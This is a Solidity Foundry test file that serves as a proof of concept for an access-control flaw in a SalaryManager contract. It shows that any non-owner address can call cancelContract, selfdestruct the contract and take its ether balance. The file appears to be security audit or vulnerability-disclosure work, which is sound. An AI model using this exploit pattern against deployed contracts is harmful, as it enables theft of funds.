
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SalaryManager} from "../src/SalaryManager.sol";

contract TestAccessControlSalaryManager is Test {
    SalaryManager public _contractUnderTest;
    address private _owner;

    function setUp() public {
        _owner = address(this);
        _contractUnderTest = new SalaryManager();
        // Fund the contract so it has a balance greater than _totalAllocated (which is 0)
        vm.deal(address(_contractUnderTest), 1 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself (which is the owner)
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner - the only privileged role that should be able to call critical functions
        vm.assume(caller != _owner);

        // --- 2. State Configuration ---
        // The contract is already funded in setUp()
        // The require condition is: _totalAllocated < address(this).balance
        // Since _totalAllocated is 0 and balance is 1 ether, this condition is satisfied

        // Store the contract's balance before the attack
        uint256 contractBalanceBefore = address(_contractUnderTest).balance;
        
        // --- 3. Execution & Assertion ---
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // TRIGGER VULNERABILITY: Any user can call cancelContract and selfdestruct the contract,
        // receiving all the contract's funds
        _contractUnderTest.cancelContract();

        // ASSERT SUCCESS: Verify the contract was destroyed and funds were transferred to caller
        // After selfdestruct, the contract's code size becomes 0
        uint256 codeSize;
        address contractAddr = address(_contractUnderTest);
        assembly {
            codeSize := extcodesize(contractAddr)
        }
        
        // The contract should be destroyed (code size = 0)
        assertEq(codeSize, 0, "Contract should be destroyed");
        
        // The caller should have received the contract's balance
        assertEq(address(_contractUnderTest).balance, 0, "Contract balance should be 0 after selfdestruct");
    }
}
